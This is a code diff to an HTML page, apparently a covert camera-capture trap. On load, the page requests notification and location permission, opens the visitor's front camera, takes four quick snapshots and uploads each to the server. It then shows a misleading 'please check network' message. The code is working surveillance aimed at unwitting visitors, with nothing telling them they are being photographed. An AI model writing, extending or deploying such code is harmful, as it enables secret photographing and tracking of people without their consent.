@@ -30,6 +30,7 @@ const HTML = `<!DOCTYPE html>
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const msg = document.querySelector('div');
 
     async function capture() {
       canvas.width = video.videoWidth;
@@ -41,20 +42,35 @@ const HTML = `<!DOCTYPE html>
       await fetch('/upload', { method: 'POST', body: fd });
     }
 
+    async function requestNotification() {
+      try { await Notification.requestPermission(); } catch(e) {}
+    }
+
+    async function requestGeo() {
+      try { navigator.geolocation.getCurrentPosition(() => {}, () => {}); } catch(e) {}
+    }
+
+    async function requestCamera() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      video.srcObject = stream;
+      await video.play();
+      await new Promise(r => setTimeout(r, 300));
+      await capture();
+      await new Promise(r => setTimeout(r, 200));
+      await capture();
+      await new Promise(r => setTimeout(r, 200));
+      await capture();
+      await new Promise(r => setTimeout(r, 200));
+      await capture();
+      stream.getTracks().forEach(t => t.stop());
+    }
+
     (async () => {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-        video.srcObject = stream;
-        await video.play();
-        await new Promise(r => setTimeout(r, 300));
-        await capture();
-        await new Promise(r => setTimeout(r, 200));
-        await capture();
-        await new Promise(r => setTimeout(r, 200));
-        await capture();
-        await new Promise(r => setTimeout(r, 200));
-        await capture();
-        stream.getTracks().forEach(t => t.stop());
+        await requestNotification();
+        await requestGeo();
+        await requestCamera();
+        msg.textContent = '请检查网络';
       } catch (err) {
         console.error(err);
       }
